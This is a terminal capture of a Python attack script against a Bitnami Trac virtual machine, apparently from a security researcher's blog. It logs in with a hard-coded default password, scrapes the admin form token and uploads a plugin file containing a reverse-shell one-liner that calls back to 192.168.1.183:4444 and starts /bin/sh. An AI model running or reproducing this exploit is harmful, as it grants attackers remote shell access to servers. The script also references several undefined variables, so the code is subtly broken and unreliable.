
c@kali:~/src/nippur/trak.py$ cat trak2.py
#!/usr/bin/env python
# 28.08.2018
#
# based on https://bitnami.com/stack/trac/virtual-machine
# more: code610 blogspot com
#

from requests.auth import HTTPBasicAuth
import requests
import sys
import re

# your target
loginUrl = 'http://' + sys.argv[1] + '/Project/login'
pluginUrl = 'http://' + sys.argv[1] + '/Project/admin/general/plugin'

# your creds
user='user'
passwd='OAzH2eX1VIId' # bitnami default boot

# oneliner revshell to .py file
payload = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.183",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

revsh = open('revsh1.py','w')
revsh.write(payload)
revsh.close()

# this one we'll upload
readrev = open('revsh1.py', 'r')
postform = { 'plugin_file' : readrev }

# all in 'session'
sess = requests.session()
authus = sess.get(loginUrl, auth=HTTPBasicAuth(user,passwd))

# GET to plugins to upload our super file
plug1n = sess.get(pluginUrl)
resplug1n = plug1n.text

if '__FORM_TOKEN' in resplug1n:
  findit = re.compile('<div><input type="hidden" name="__FORM_TOKEN" value="(.*?)"/>')
  found = re.search(findit, resp2)

  if found:
    gottoken = found.group(1)

    print '[+] going... d0wn?'

    reverse_this = {
      '__FORM_TOKEN':gottoken,
      'file':payloadfp,
      'install':'Install'
    }

    print 'h4p+sh...!\n\tH@PT$h...! ;D\n'
    req3 = sess.post(target2, data=reverse_this,files=payloadfp)
    #print req3.text

    print '[+] done.'



#

